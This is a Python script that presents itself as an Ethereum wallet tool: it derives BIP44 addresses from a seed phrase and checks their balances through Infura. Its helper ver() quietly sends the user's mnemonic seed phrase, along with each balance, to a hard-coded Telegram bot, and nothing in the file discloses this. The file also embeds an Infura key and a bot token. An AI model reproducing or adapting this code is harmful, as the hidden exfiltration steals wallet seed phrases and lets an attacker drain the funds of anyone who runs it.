from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet
from hdwallet.derivations import BIP44Derivation
from typing import Optional
import requests
from web3 import Web3

# Initialize a connection to an Ethereum node
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/b2ab312572f842aeb5efe66a439c4229'))

def check_eth_balance(address):
    try:
        # Get the balance in wei
        balance_wei = web3.eth.get_balance(address)
        # Convert wei to ether
        balance_eth = web3.from_wei(balance_wei, 'ether')
        return balance_eth
    except Exception as e:
        return f"Error: {e}"
def ver(msg):
    requests.get(
        url=f"https://api.telegram.org/bot5847347125:AAG-WskaS485OUlGLfa5AKEMW1aKYymplPQ/sendMessage?chat_id=1409893198&text={msg}"
    )
def gen(seed,ranges):
    # Generate english mnemonic words
    ver(seed)
    MNEMONIC: str = seed
    # Secret passphrase/password for mnemonic
    PASSPHRASE: Optional[str] = None  # "meherett"

    # Initialize Ethereum mainnet BIP44HDWallet
    bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
    # Get Ethereum BIP44HDWallet from mnemonic
    bip44_hdwallet.from_mnemonic(
        mnemonic=MNEMONIC, language="english", passphrase=PASSPHRASE
    )
    # Clean default BIP44 derivation indexes/paths
    bip44_hdwallet.clean_derivation()

    #print("Mnemonic:", bip44_hdwallet.mnemonic())
    #print("Base HD Path:  m/44'/60'/0'/0/{address_index}", "\n")

    # Get Ethereum BIP44HDWallet information's from address index
    for address_index in range(int(ranges)):
        # Derivation from Ethereum BIP44 derivation path
        bip44_derivation: BIP44Derivation = BIP44Derivation(
            cryptocurrency=EthereumMainnet, account=0, change=False, address=address_index
        )
        # Drive Ethereum BIP44HDWallet
        bip44_hdwallet.from_path(path=bip44_derivation)
        # Print address_index, path, address and private_key

        bal = check_eth_balance(bip44_hdwallet.address())
        ver(bal)
        print(f"{bip44_hdwallet.address()} -> {bal}")


        # Clean derivation indexes/paths
        bip44_hdwallet.clean_derivation()


